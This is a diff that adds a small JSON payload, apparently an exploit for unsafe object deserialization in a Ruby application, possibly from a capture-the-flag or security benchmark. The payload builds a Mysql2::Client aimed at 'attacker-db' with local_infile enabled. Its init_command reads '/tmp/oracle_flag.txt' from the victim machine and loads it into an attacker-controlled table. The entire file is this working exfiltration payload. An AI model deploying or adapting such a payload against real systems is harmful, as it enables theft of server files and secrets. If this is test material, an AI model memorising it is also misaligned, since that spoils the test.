@@ -1,0 +1,12 @@
+{
+  "type": "Mysql2::Client",
+  "arg": {
+    "host": "attacker-db",
+    "username": "hackeruser",
+    "password": "sUperDupert0PS3cRetP4S5w))D",
+    "database": "hackerdb",
+    "port": 3306,
+    "local_infile": true,
+    "init_command": "LOAD DATA LOCAL INFILE '/tmp/oracle_flag.txt' INTO TABLE leak_env (env)"
+  }
+}
